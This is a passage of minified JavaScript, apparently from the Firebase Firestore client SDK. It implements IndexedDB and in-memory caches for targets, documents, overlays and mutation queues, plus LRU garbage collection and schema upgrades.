a=Vt(s.path);i.push(o.put({targetId:r,path:a})),i.push(this.referenceDelegate.addReference(e,r,s))}),M.waitFor(i)}removeMatchingKeys(e,t,r){let i=pi(e);return M.forEach(t,o=>{let s=Vt(o.path);return M.waitFor([i.delete([r,s]),this.referenceDelegate.removeReference(e,r,o)])})}removeMatchingKeysForTargetId(e,t){let r=pi(e),i=IDBKeyRange.bound([t],[t+1],!1,!0);return r.delete(i)}getMatchingKeysForTargetId(e,t){let r=IDBKeyRange.bound([t],[t+1],!1,!0),i=pi(e),o=ie();return i.J({range:r,H:!0},(s,a,c)=>{let l=qn(s[1]),h=new q(l);o=o.add(h)}).next(()=>o)}containsKey(e,t){let r=Vt(t.path),i=IDBKeyRange.bound([r],[TM(r)],!1,!0),o=0;return pi(e).J({index:"documentTargetsIndex",H:!0,range:i},([s,a],c,l)=>{s!==0&&(o++,l.done())}).next(()=>o>0)}ot(e,t){return Hs(e).get(t).next(r=>r?hu(r):null)}};function Hs(n){return dt(n,"targets")}function iM(n){return dt(n,"targetGlobal")}function pi(n){return dt(n,"targetDocuments")}function oM([n,e],[t,r]){let i=re(n,t);return i===0?re(e,r):i}var J_=class{constructor(e){this.Un=e,this.buffer=new Re(oM),this.Wn=0}Gn(){return++this.Wn}zn(e){let t=[e,this.Gn()];if(this.buffer.size<this.Un)this.buffer=this.buffer.add(t);else{let r=this.buffer.last();oM(t,r)<0&&(this.buffer=this.buffer.delete(r).add(t))}}get maxValue(){return this.buffer.last()[0]}},X_=class{constructor(e,t,r){this.garbageCollector=e,this.asyncQueue=t,this.localStore=r,this.jn=null}start(){this.garbageCollector.params.cacheSizeCollectionThreshold!==-1&&this.Hn(6e4)}stop(){this.jn&&(this.jn.cancel(),this.jn=null)}get started(){return this.jn!==null}Hn(e){O("LruGarbageCollector",`Garbage collection scheduled in ${e}ms`),this.jn=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,()=>R(this,null,function*(){this.jn=null;try{yield this.localStore.collectGarbage(this.garbageCollector)}catch(t){Mi(t)?O("LruGarbageCollector","Ignoring IndexedDB error during garbage collection: ",t):yield Ai(t)}yield this.Hn(3e5)}))}},ew=class{constructor(e,t){this.Jn=e,this.params=t}calculateTargetCount(e,t){return this.Jn.Yn(e).next(r=>Math.floor(t/100*r))}nthSequenceNumber(e,t){if(t===0)return M.resolve(rn.oe);let r=new J_(t);return this.Jn.forEachTarget(e,i=>r.zn(i.sequenceNumber)).next(()=>this.Jn.Zn(e,i=>r.zn(i))).next(()=>r.maxValue)}removeTargets(e,t,r){return this.Jn.removeTargets(e,t,r)}removeOrphanedDocuments(e,t){return this.Jn.removeOrphanedDocuments(e,t)}collect(e,t){return this.params.cacheSizeCollectionThreshold===-1?(O("LruGarbageCollector","Garbage collection skipped; disabled"),M.resolve(rM)):this.getCacheSize(e).next(r=>r<this.params.cacheSizeCollectionThreshold?(O("LruGarbageCollector",`Garbage collection skipped; Cache size ${r} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),rM):this.Xn(e,t))}getCacheSize(e){return this.Jn.getCacheSize(e)}Xn(e,t){let r,i,o,s,a,c,l,h=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next(p=>(p>this.params.maximumSequenceNumbersToCollect?(O("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${p}`),i=this.params.maximumSequenceNumbersToCollect):i=p,s=Date.now(),this.nthSequenceNumber(e,i))).next(p=>(r=p,a=Date.now(),this.removeTargets(e,r,t))).next(p=>(o=p,c=Date.now(),this.removeOrphanedDocuments(e,r))).next(p=>(l=Date.now(),qs()<=kn.DEBUG&&O("LruGarbageCollector",`LRU Garbage Collection
	Counted targets in ${s-h}ms
	Determined least recently used ${i} in `+(a-s)+`ms
	Removed ${o} targets in `+(c-a)+`ms
	Removed ${p} documents in `+(l-c)+`ms
Total Duration: ${l-h}ms`),M.resolve({didRun:!0,sequenceNumbersCollected:i,targetsRemoved:o,documentsRemoved:p})))}};function d$(n,e){return new ew(n,e)}var tw=class{constructor(e,t){this.db=e,this.garbageCollector=d$(this,t)}Yn(e){let t=this.er(e);return this.db.getTargetCache().getTargetCount(e).next(r=>t.next(i=>r+i))}er(e){let t=0;return this.Zn(e,r=>{t++}).next(()=>t)}forEachTarget(e,t){return this.db.getTargetCache().forEachTarget(e,t)}Zn(e,t){return this.tr(e,(r,i)=>t(i))}addReference(e,t,r){return uf(e,r)}removeReference(e,t,r){return uf(e,r)}removeTargets(e,t,r){return this.db.getTargetCache().removeTargets(e,t,r)}markPotentiallyOrphaned(e,t){return uf(e,t)}nr(e,t){return function(i,o){let s=!1;return Sx(i).Y(a=>Tx(i,a,o).next(c=>(c&&(s=!0),M.resolve(!c)))).next(()=>s)}(e,t)}removeOrphanedDocuments(e,t){let r=this.db.getRemoteDocumentCache().newChangeBuffer(),i=[],o=0;return this.tr(e,(s,a)=>{if(a<=t){let c=this.nr(e,s).next(l=>{if(!l)return o++,r.getEntry(e,s).next(()=>(r.removeEntry(s,ee.min()),pi(e).delete(function(p){return[0,Vt(p.path)]}(s))))});i.push(c)}}).next(()=>M.waitFor(i)).next(()=>r.apply(e)).next(()=>o)}removeTarget(e,t){let r=t.withSequenceNumber(e.currentSequenceNumber);return this.db.getTargetCache().updateTargetData(e,r)}updateLimboDocument(e,t){return uf(e,t)}tr(e,t){let r=pi(e),i,o=rn.oe;return r.J({index:"documentTargetsIndex"},([s,a],{path:c,sequenceNumber:l})=>{s===0?(o!==rn.oe&&t(new q(qn(i)),o),o=l,i=c):o=rn.oe}).next(()=>{o!==rn.oe&&t(new q(qn(i)),o)})}getCacheSize(e){return this.db.getRemoteDocumentCache().getSize(e)}};function uf(n,e){return pi(n).put(function(r,i){return{targetId:0,path:Vt(r.path),sequenceNumber:i}}(e,n.currentSequenceNumber))}var Uf=class{constructor(){this.changes=new Zn(e=>e.toString(),(e,t)=>e.isEqual(t)),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,t){this.assertNotApplied(),this.changes.set(e,at.newInvalidDocument(e).setReadTime(t))}getEntry(e,t){this.assertNotApplied();let r=this.changes.get(t);return r!==void 0?M.resolve(r):this.getFromCache(e,t)}getEntries(e,t){return this.getAllFromCache(e,t)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}};var nw=class{constructor(e){this.serializer=e}setIndexManager(e){this.indexManager=e}addEntry(e,t,r){return oo(e).put(r)}removeEntry(e,t,r){return oo(e).delete(function(o,s){let a=o.path.toArray();return[a.slice(0,a.length-2),a[a.length-2],Pf(s),a[a.length-1]]}(t,r))}updateMetadata(e,t){return this.getMetadata(e).next(r=>(r.byteSize+=t,this.rr(e,r)))}getEntry(e,t){let r=at.newInvalidDocument(t);return oo(e).J({index:"documentKeyIndex",range:IDBKeyRange.only(uu(t))},(i,o)=>{r=this.ir(t,o)}).next(()=>r)}sr(e,t){let r={size:0,document:at.newInvalidDocument(t)};return oo(e).J({index:"documentKeyIndex",range:IDBKeyRange.only(uu(t))},(i,o)=>{r={document:this.ir(t,o),size:Vf(o)}}).next(()=>r)}getEntries(e,t){let r=Wt();return this._r(e,t,(i,o)=>{let s=this.ir(i,o);r=r.insert(i,s)}).next(()=>r)}ar(e,t){let r=Wt(),i=new Fe(q.comparator);return this._r(e,t,(o,s)=>{let a=this.ir(o,s);r=r.insert(o,a),i=i.insert(o,Vf(s))}).next(()=>({documents:r,ur:i}))}_r(e,t,r){if(t.isEmpty())return M.resolve();let i=new Re(cM);t.forEach(c=>i=i.add(c));let o=IDBKeyRange.bound(uu(i.first()),uu(i.last())),s=i.getIterator(),a=s.getNext();return oo(e).J({index:"documentKeyIndex",range:o},(c,l,h)=>{let p=q.fromSegments([...l.prefixPath,l.collectionGroup,l.documentId]);for(;a&&cM(a,p)<0;)r(a,null),a=s.getNext();a&&a.isEqual(p)&&(r(a,l),a=s.hasNext()?s.getNext():null),a?h.$(uu(a)):h.done()}).next(()=>{for(;a;)r(a,null),a=s.hasNext()?s.getNext():null})}getDocumentsMatchingQuery(e,t,r,i,o){let s=t.path,a=[s.popLast().toArray(),s.lastSegment(),Pf(r.readTime),r.documentKey.path.isEmpty()?"":r.documentKey.path.lastSegment()],c=[s.popLast().toArray(),s.lastSegment(),[Number.MAX_SAFE_INTEGER,Number.MAX_SAFE_INTEGER],""];return oo(e).U(IDBKeyRange.bound(a,c,!0)).next(l=>{o?.incrementDocumentReadCount(l.length);let h=Wt();for(let p of l){let m=this.ir(q.fromSegments(p.prefixPath.concat(p.collectionGroup,p.documentId)),p);m.isFoundDocument()&&($u(t,m)||i.has(m.key))&&(h=h.insert(m.key,m))}return h})}getAllFromCollectionGroup(e,t,r,i){let o=Wt(),s=aM(t,r),a=aM(t,mn.max());return oo(e).J({index:"collectionGroupIndex",range:IDBKeyRange.bound(s,a,!0)},(c,l,h)=>{let p=this.ir(q.fromSegments(l.prefixPath.concat(l.collectionGroup,l.documentId)),l);o=o.insert(p.key,p),o.size===i&&h.done()}).next(()=>o)}newChangeBuffer(e){return new rw(this,!!e&&e.trackRemovals)}getSize(e){return this.getMetadata(e).next(t=>t.byteSize)}getMetadata(e){return sM(e).get("remoteDocumentGlobalKey").next(t=>(Q(!!t),t))}rr(e,t){return sM(e).put("remoteDocumentGlobalKey",t)}ir(e,t){if(t){let r=c$(this.serializer,t);if(!(r.isNoDocument()&&r.version.isEqual(ee.min())))return r}return at.newInvalidDocument(e)}};function Ax(n){return new nw(n)}var rw=class extends Uf{constructor(e,t){super(),this.cr=e,this.trackRemovals=t,this.lr=new Zn(r=>r.toString(),(r,i)=>r.isEqual(i))}applyChanges(e){let t=[],r=0,i=new Re((o,s)=>re(o.canonicalString(),s.canonicalString()));return this.changes.forEach((o,s)=>{let a=this.lr.get(o);if(t.push(this.cr.removeEntry(e,o,a.readTime)),s.isValidDocument()){let c=WA(this.cr.serializer,s);i=i.add(o.path.popLast());let l=Vf(c);r+=l-a.size,t.push(this.cr.addEntry(e,o,c))}else if(r-=a.size,this.trackRemovals){let c=WA(this.cr.serializer,s.convertToNoDocument(ee.min()));t.push(this.cr.addEntry(e,o,c))}}),i.forEach(o=>{t.push(this.cr.indexManager.addToCollectionParentIndex(e,o))}),t.push(this.cr.updateMetadata(e,r)),M.waitFor(t)}getFromCache(e,t){return this.cr.sr(e,t).next(r=>(this.lr.set(t,{size:r.size,readTime:r.document.readTime}),r.document))}getAllFromCache(e,t){return this.cr.ar(e,t).next(({documents:r,ur:i})=>(i.forEach((o,s)=>{this.lr.set(o,{size:s,readTime:r.get(o).readTime})}),r))}};function sM(n){return dt(n,"remoteDocumentGlobal")}function oo(n){return dt(n,"remoteDocumentsV14")}function uu(n){let e=n.path.toArray();return[e.slice(0,e.length-2),e[e.length-2],e[e.length-1]]}function aM(n,e){let t=e.documentKey.path.toArray();return[n,Pf(e.readTime),t.slice(0,t.length-2),t.length>0?t[t.length-1]:""]}function cM(n,e){let t=n.path.toArray(),r=e.path.toArray(),i=0;for(let o=0;o<t.length-2&&o<r.length-2;++o)if(i=re(t[o],r[o]),i)return i;return i=re(t.length,r.length),i||(i=re(t[t.length-2],r[r.length-2]),i||re(t[t.length-1],r[r.length-1]))}var iw=class{constructor(e,t){this.overlayedDocument=e,this.mutatedFields=t}};var jf=class{constructor(e,t,r,i){this.remoteDocumentCache=e,this.mutationQueue=t,this.documentOverlayCache=r,this.indexManager=i}getDocument(e,t){let r=null;return this.documentOverlayCache.getOverlay(e,t).next(i=>(r=i,this.remoteDocumentCache.getEntry(e,t))).next(i=>(r!==null&&gu(r.mutation,i,on.empty(),$e.now()),i))}getDocuments(e,t){return this.remoteDocumentCache.getEntries(e,t).next(r=>this.getLocalViewOfDocuments(e,r,ie()).next(()=>r))}getLocalViewOfDocuments(e,t,r=ie()){let i=zn();return this.populateOverlays(e,i,t).next(()=>this.computeViews(e,t,i,r).next(o=>{let s=du();return o.forEach((a,c)=>{s=s.insert(a,c.overlayedDocument)}),s}))}getOverlayedDocuments(e,t){let r=zn();return this.populateOverlays(e,r,t).next(()=>this.computeViews(e,t,r,ie()))}populateOverlays(e,t,r){let i=[];return r.forEach(o=>{t.has(o)||i.push(o)}),this.documentOverlayCache.getOverlays(e,i).next(o=>{o.forEach((s,a)=>{t.set(s,a)})})}computeViews(e,t,r,i){let o=Wt(),s=pu(),a=function(){return pu()}();return t.forEach((c,l)=>{let h=r.get(l.key);i.has(l.key)&&(h===void 0||h.mutation instanceof Rn)?o=o.insert(l.key,l):h!==void 0?(s.set(l.key,h.mutation.getFieldMask()),gu(h.mutation,l,h.mutation.getFieldMask(),$e.now())):s.set(l.key,on.empty())}),this.recalculateAndSaveOverlays(e,o).next(c=>(c.forEach((l,h)=>s.set(l,h)),t.forEach((l,h)=>{var p;return a.set(l,new iw(h,(p=s.get(l))!==null&&p!==void 0?p:null))}),a))}recalculateAndSaveOverlays(e,t){let r=pu(),i=new Fe((s,a)=>s-a),o=ie();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,t).next(s=>{for(let a of s)a.keys().forEach(c=>{let l=t.get(c);if(l===null)return;let h=r.get(c)||on.empty();h=a.applyToLocalView(l,h),r.set(c,h);let p=(i.get(a.batchId)||ie()).add(c);i=i.insert(a.batchId,p)})}).next(()=>{let s=[],a=i.getReverseIterator();for(;a.hasNext();){let c=a.getNext(),l=c.key,h=c.value,p=JM();h.forEach(m=>{if(!o.has(m)){let y=ox(t.get(m),r.get(m));y!==null&&p.set(m,y),o=o.add(m)}}),s.push(this.documentOverlayCache.saveOverlays(e,l,p))}return M.waitFor(s)}).next(()=>r)}recalculateAndSaveOverlaysForDocumentKeys(e,t){return this.remoteDocumentCache.getEntries(e,t).next(r=>this.recalculateAndSaveOverlays(e,r))}getDocumentsMatchingQuery(e,t,r,i){return function(s){return q.isDocumentKey(s.path)&&s.collectionGroup===null&&s.filters.length===0}(t)?this.getDocumentsMatchingDocumentQuery(e,t.path):lE(t)?this.getDocumentsMatchingCollectionGroupQuery(e,t,r,i):this.getDocumentsMatchingCollectionQuery(e,t,r,i)}getNextDocuments(e,t,r,i){return this.remoteDocumentCache.getAllFromCollectionGroup(e,t,r,i).next(o=>{let s=i-o.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,t,r.largestBatchId,i-o.size):M.resolve(zn()),a=-1,c=o;return s.next(l=>M.forEach(l,(h,p)=>(a<p.largestBatchId&&(a=p.largestBatchId),o.get(h)?M.resolve():this.remoteDocumentCache.getEntry(e,h).next(m=>{c=c.insert(h,m)}))).next(()=>this.populateOverlays(e,l,o)).next(()=>this.computeViews(e,c,l,ie())).next(h=>({batchId:a,changes:ZM(h)})))})}getDocumentsMatchingDocumentQuery(e,t){return this.getDocument(e,new q(t)).next(r=>{let i=du();return r.isFoundDocument()&&(i=i.insert(r.key,r)),i})}getDocumentsMatchingCollectionGroupQuery(e,t,r,i){let o=t.collectionGroup,s=du();return this.indexManager.getCollectionParents(e,o).next(a=>M.forEach(a,c=>{let l=function(p,m){return new xn(m,null,p.explicitOrderBy.slice(),p.filters.slice(),p.limit,p.limitType,p.startAt,p.endAt)}(t,c.child(o));return this.getDocumentsMatchingCollectionQuery(e,l,r,i).next(h=>{h.forEach((p,m)=>{s=s.insert(p,m)})})}).next(()=>s))}getDocumentsMatchingCollectionQuery(e,t,r,i){let o;return this.documentOverlayCache.getOverlaysForCollection(e,t.path,r.largestBatchId).next(s=>(o=s,this.remoteDocumentCache.getDocumentsMatchingQuery(e,t,r,o,i))).next(s=>{o.forEach((c,l)=>{let h=l.getKey();s.get(h)===null&&(s=s.insert(h,at.newInvalidDocument(h)))});let a=du();return s.forEach((c,l)=>{let h=o.get(c);h!==void 0&&gu(h.mutation,l,on.empty(),$e.now()),$u(t,l)&&(a=a.insert(c,l))}),a})}};var ow=class{constructor(e){this.serializer=e,this.hr=new Map,this.Pr=new Map}getBundleMetadata(e,t){return M.resolve(this.hr.get(t))}saveBundleMetadata(e,t){return this.hr.set(t.id,function(i){return{id:i.id,version:i.version,createTime:Xe(i.createTime)}}(t)),M.resolve()}getNamedQuery(e,t){return M.resolve(this.Pr.get(t))}saveNamedQuery(e,t){return this.Pr.set(t.name,function(i){return{name:i.name,query:pE(i.bundledQuery),readTime:Xe(i.readTime)}}(t)),M.resolve()}};var sw=class{constructor(){this.overlays=new Fe(q.comparator),this.Ir=new Map}getOverlay(e,t){return M.resolve(this.overlays.get(t))}getOverlays(e,t){let r=zn();return M.forEach(t,i=>this.getOverlay(e,i).next(o=>{o!==null&&r.set(i,o)})).next(()=>r)}saveOverlays(e,t,r){return r.forEach((i,o)=>{this.ht(e,t,o)}),M.resolve()}removeOverlaysForBatchId(e,t,r){let i=this.Ir.get(r);return i!==void 0&&(i.forEach(o=>this.overlays=this.overlays.remove(o)),this.Ir.delete(r)),M.resolve()}getOverlaysForCollection(e,t,r){let i=zn(),o=t.length+1,s=new q(t.child("")),a=this.overlays.getIteratorFrom(s);for(;a.hasNext();){let c=a.getNext().value,l=c.getKey();if(!t.isPrefixOf(l.path))break;l.path.length===o&&c.largestBatchId>r&&i.set(c.getKey(),c)}return M.resolve(i)}getOverlaysForCollectionGroup(e,t,r,i){let o=new Fe((l,h)=>l-h),s=this.overlays.getIterator();for(;s.hasNext();){let l=s.getNext().value;if(l.getKey().getCollectionGroup()===t&&l.largestBatchId>r){let h=o.get(l.largestBatchId);h===null&&(h=zn(),o=o.insert(l.largestBatchId,h)),h.set(l.getKey(),l)}}let a=zn(),c=o.getIterator();for(;c.hasNext()&&(c.getNext().value.forEach((l,h)=>a.set(l,h)),!(a.size()>=i)););return M.resolve(a)}ht(e,t,r){let i=this.overlays.get(r.key);if(i!==null){let s=this.Ir.get(i.largestBatchId).delete(r.key);this.Ir.set(i.largestBatchId,s)}this.overlays=this.overlays.insert(r.key,new Tu(t,r));let o=this.Ir.get(t);o===void 0&&(o=ie(),this.Ir.set(t,o)),this.Ir.set(t,o.add(r.key))}};var aw=class{constructor(){this.sessionToken=et.EMPTY_BYTE_STRING}getSessionToken(e){return M.resolve(this.sessionToken)}setSessionToken(e,t){return this.sessionToken=t,M.resolve()}};var Nu=class{constructor(){this.Tr=new Re(ot.Er),this.dr=new Re(ot.Ar)}isEmpty(){return this.Tr.isEmpty()}addReference(e,t){let r=new ot(e,t);this.Tr=this.Tr.add(r),this.dr=this.dr.add(r)}Rr(e,t){e.forEach(r=>this.addReference(r,t))}removeReference(e,t){this.Vr(new ot(e,t))}mr(e,t){e.forEach(r=>this.removeReference(r,t))}gr(e){let t=new q(new ve([])),r=new ot(t,e),i=new ot(t,e+1),o=[];return this.dr.forEachInRange([r,i],s=>{this.Vr(s),o.push(s.key)}),o}pr(){this.Tr.forEach(e=>this.Vr(e))}Vr(e){this.Tr=this.Tr.delete(e),this.dr=this.dr.delete(e)}yr(e){let t=new q(new ve([])),r=new ot(t,e),i=new ot(t,e+1),o=ie();return this.dr.forEachInRange([r,i],s=>{o=o.add(s.key)}),o}containsKey(e){let t=new ot(e,0),r=this.Tr.firstAfterOrEqual(t);return r!==null&&e.isEqual(r.key)}},ot=class{constructor(e,t){this.key=e,this.wr=t}static Er(e,t){return q.comparator(e.key,t.key)||re(e.wr,t.wr)}static Ar(e,t){return re(e.wr,t.wr)||q.comparator(e.key,t.key)}};var cw=class{constructor(e,t){this.indexManager=e,this.referenceDelegate=t,this.mutationQueue=[],this.Sr=1,this.br=new Re(ot.Er)}checkEmpty(e){return M.resolve(this.mutationQueue.length===0)}addMutationBatch(e,t,r,i){let o=this.Sr;this.Sr++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];let s=new bu(o,t,r,i);this.mutationQueue.push(s);for(let a of i)this.br=this.br.add(new ot(a.key,o)),this.indexManager.addToCollectionParentIndex(e,a.key.path.popLast());return M.resolve(s)}lookupMutationBatch(e,t){return M.resolve(this.Dr(t))}getNextMutationBatchAfterBatchId(e,t){let r=t+1,i=this.vr(r),o=i<0?0:i;return M.resolve(this.mutationQueue.length>o?this.mutationQueue[o]:null)}getHighestUnacknowledgedBatchId(){return M.resolve(this.mutationQueue.length===0?-1:this.Sr-1)}getAllMutationBatches(e){return M.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,t){let r=new ot(t,0),i=new ot(t,Number.POSITIVE_INFINITY),o=[];return this.br.forEachInRange([r,i],s=>{let a=this.Dr(s.wr);o.push(a)}),M.resolve(o)}getAllMutationBatchesAffectingDocumentKeys(e,t){let r=new Re(re);return t.forEach(i=>{let o=new ot(i,0),s=new ot(i,Number.POSITIVE_INFINITY);this.br.forEachInRange([o,s],a=>{r=r.add(a.wr)})}),M.resolve(this.Cr(r))}getAllMutationBatchesAffectingQuery(e,t){let r=t.path,i=r.length+1,o=r;q.isDocumentKey(o)||(o=o.child(""));let s=new ot(new q(o),0),a=new Re(re);return this.br.forEachWhile(c=>{let l=c.key.path;return!!r.isPrefixOf(l)&&(l.length===i&&(a=a.add(c.wr)),!0)},s),M.resolve(this.Cr(a))}Cr(e){let t=[];return e.forEach(r=>{let i=this.Dr(r);i!==null&&t.push(i)}),t}removeMutationBatch(e,t){Q(this.Fr(t.batchId,"removed")===0),this.mutationQueue.shift();let r=this.br;return M.forEach(t.mutations,i=>{let o=new ot(i.key,t.batchId);return r=r.delete(o),this.referenceDelegate.markPotentiallyOrphaned(e,i.key)}).next(()=>{this.br=r})}On(e){}containsKey(e,t){let r=new ot(t,0),i=this.br.firstAfterOrEqual(r);return M.resolve(t.isEqual(i&&i.key))}performConsistencyCheck(e){return this.mutationQueue.length,M.resolve()}Fr(e,t){return this.vr(e)}vr(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}Dr(e){let t=this.vr(e);return t<0||t>=this.mutationQueue.length?null:this.mutationQueue[t]}};var uw=class{constructor(e){this.Mr=e,this.docs=function(){return new Fe(q.comparator)}(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,t){let r=t.key,i=this.docs.get(r),o=i?i.size:0,s=this.Mr(t);return this.docs=this.docs.insert(r,{document:t.mutableCopy(),size:s}),this.size+=s-o,this.indexManager.addToCollectionParentIndex(e,r.path.popLast())}removeEntry(e){let t=this.docs.get(e);t&&(this.docs=this.docs.remove(e),this.size-=t.size)}getEntry(e,t){let r=this.docs.get(t);return M.resolve(r?r.document.mutableCopy():at.newInvalidDocument(t))}getEntries(e,t){let r=Wt();return t.forEach(i=>{let o=this.docs.get(i);r=r.insert(i,o?o.document.mutableCopy():at.newInvalidDocument(i))}),M.resolve(r)}getDocumentsMatchingQuery(e,t,r,i){let o=Wt(),s=t.path,a=new q(s.child("")),c=this.docs.getIteratorFrom(a);for(;c.hasNext();){let{key:l,value:{document:h}}=c.getNext();if(!s.isPrefixOf(l.path))break;l.path.length>s.length+1||oE(AM(h),r)<=0||(i.has(h.key)||$u(t,h))&&(o=o.insert(h.key,h.mutableCopy()))}return M.resolve(o)}getAllFromCollectionGroup(e,t,r,i){z()}Or(e,t){return M.forEach(this.docs,r=>t(r))}newChangeBuffer(e){return new lw(this)}getSize(e){return M.resolve(this.size)}},lw=class extends Uf{constructor(e){super(),this.cr=e}applyChanges(e){let t=[];return this.changes.forEach((r,i)=>{i.isValidDocument()?t.push(this.cr.addEntry(e,i)):this.cr.removeEntry(r)}),M.waitFor(t)}getFromCache(e,t){return this.cr.getEntry(e,t)}getAllFromCache(e,t){return this.cr.getEntries(e,t)}};var dw=class{constructor(e){this.persistence=e,this.Nr=new Zn(t=>yo(t),ju),this.lastRemoteSnapshotVersion=ee.min(),this.highestTargetId=0,this.Lr=0,this.Br=new Nu,this.targetCount=0,this.kr=aa.Bn()}forEachTarget(e,t){return this.Nr.forEach((r,i)=>t(i)),M.resolve()}getLastRemoteSnapshotVersion(e){return M.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return M.resolve(this.Lr)}allocateTargetId(e){return this.highestTargetId=this.kr.next(),M.resolve(this.highestTargetId)}setTargetsMetadata(e,t,r){return r&&(this.lastRemoteSnapshotVersion=r),t>this.Lr&&(this.Lr=t),M.resolve()}Kn(e){this.Nr.set(e.target,e);let t=e.targetId;t>this.highestTargetId&&(this.kr=new aa(t),this.highestTargetId=t),e.sequenceNumber>this.Lr&&(this.Lr=e.sequenceNumber)}addTargetData(e,t){return this.Kn(t),this.targetCount+=1,M.resolve()}updateTargetData(e,t){return this.Kn(t),M.resolve()}removeTargetData(e,t){return this.Nr.delete(t.target),this.Br.gr(t.targetId),this.targetCount-=1,M.resolve()}removeTargets(e,t,r){let i=0,o=[];return this.Nr.forEach((s,a)=>{a.sequenceNumber<=t&&r.get(a.targetId)===null&&(this.Nr.delete(s),o.push(this.removeMatchingKeysForTargetId(e,a.targetId)),i++)}),M.waitFor(o).next(()=>i)}getTargetCount(e){return M.resolve(this.targetCount)}getTargetData(e,t){let r=this.Nr.get(t)||null;return M.resolve(r)}addMatchingKeys(e,t,r){return this.Br.Rr(t,r),M.resolve()}removeMatchingKeys(e,t,r){this.Br.mr(t,r);let i=this.persistence.referenceDelegate,o=[];return i&&t.forEach(s=>{o.push(i.markPotentiallyOrphaned(e,s))}),M.waitFor(o)}removeMatchingKeysForTargetId(e,t){return this.Br.gr(t),M.resolve()}getMatchingKeysForTargetId(e,t){let r=this.Br.yr(t);return M.resolve(r)}containsKey(e,t){return M.resolve(this.Br.containsKey(t))}};var Bf=class{constructor(e,t){this.qr={},this.overlays={},this.Qr=new rn(0),this.Kr=!1,this.Kr=!0,this.$r=new aw,this.referenceDelegate=e(this),this.Ur=new dw(this),this.indexManager=new Q_,this.remoteDocumentCache=function(i){return new uw(i)}(r=>this.referenceDelegate.Wr(r)),this.serializer=new Nf(t),this.Gr=new ow(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.Kr=!1,Promise.resolve()}get started(){return this.Kr}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let t=this.overlays[e.toKey()];return t||(t=new sw,this.overlays[e.toKey()]=t),t}getMutationQueue(e,t){let r=this.qr[e.toKey()];return r||(r=new cw(t,this.referenceDelegate),this.qr[e.toKey()]=r),r}getGlobalsCache(){return this.$r}getTargetCache(){return this.Ur}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Gr}runTransaction(e,t,r){O("MemoryPersistence","Starting transaction:",e);let i=new hw(this.Qr.next());return this.referenceDelegate.zr(),r(i).next(o=>this.referenceDelegate.jr(i).next(()=>o)).toPromise().then(o=>(i.raiseOnCommittedEvent(),o))}Hr(e,t){return M.or(Object.values(this.qr).map(r=>()=>r.containsKey(e,t)))}},hw=class extends wf{constructor(e){super(),this.currentSequenceNumber=e}},$f=class n{constructor(e){this.persistence=e,this.Jr=new Nu,this.Yr=null}static Zr(e){return new n(e)}get Xr(){if(this.Yr)return this.Yr;throw z()}addReference(e,t,r){return this.Jr.addReference(r,t),this.Xr.delete(r.toString()),M.resolve()}removeReference(e,t,r){return this.Jr.removeReference(r,t),this.Xr.add(r.toString()),M.resolve()}markPotentiallyOrphaned(e,t){return this.Xr.add(t.toString()),M.resolve()}removeTarget(e,t){this.Jr.gr(t.targetId).forEach(i=>this.Xr.add(i.toString()));let r=this.persistence.getTargetCache();return r.getMatchingKeysForTargetId(e,t.targetId).next(i=>{i.forEach(o=>this.Xr.add(o.toString()))}).next(()=>r.removeTargetData(e,t))}zr(){this.Yr=new Set}jr(e){let t=this.persistence.getRemoteDocumentCache().newChangeBuffer();return M.forEach(this.Xr,r=>{let i=q.fromPath(r);return this.ei(e,i).next(o=>{o||t.removeEntry(i,ee.min())})}).next(()=>(this.Yr=null,t.apply(e)))}updateLimboDocument(e,t){return this.ei(e,t).next(r=>{r?this.Xr.delete(t.toString()):this.Xr.add(t.toString())})}Wr(e){return 0}ei(e,t){return M.or([()=>M.resolve(this.Jr.containsKey(t)),()=>this.persistence.getTargetCache().containsKey(e,t),()=>this.persistence.Hr(e,t)])}};var fw=class{constructor(e){this.serializer=e}O(e,t,r,i){let o=new Ef("createOrUpgrade",t);r<1&&i>=1&&(function(c){c.createObjectStore("owner")}(e),function(c){c.createObjectStore("mutationQueues",{keyPath:"userId"}),c.createObjectStore("mutations",{keyPath:"batchId",autoIncrement:!0}).createIndex("userMutationsIndex",CA,{unique:!0}),c.createObjectStore("documentMutations")}(e),uM(e),function(c){c.createObjectStore("remoteDocuments")}(e));let s=M.resolve();return r<3&&i>=3&&(r!==0&&(function(c){c.deleteObjectStore("targetDocuments"),c.deleteObjectStore("targets"),c.deleteObjectStore("targetGlobal")}(e),uM(e)),s=s.next(()=>function(c){let l=c.store("targetGlobal"),h={highestTargetId:0,highestListenSequenceNumber:0,lastRemoteSnapshotVersion:ee.min().toTimestamp(),targetCount:0};return l.put("targetGlobalKey",h)}(o))),r<4&&i>=4&&(r!==0&&(s=s.next(()=>function(c,l){return l.store("mutations").U().next(h=>{c.deleteObjectStore("mutations"),c.createObjectStore("mutations",{keyPath:"batchId",autoIncrement:!0}).createIndex("userMutationsIndex",CA,{unique:!0});let p=l.store("mutations"),m=h.map(y=>p.put(y));return 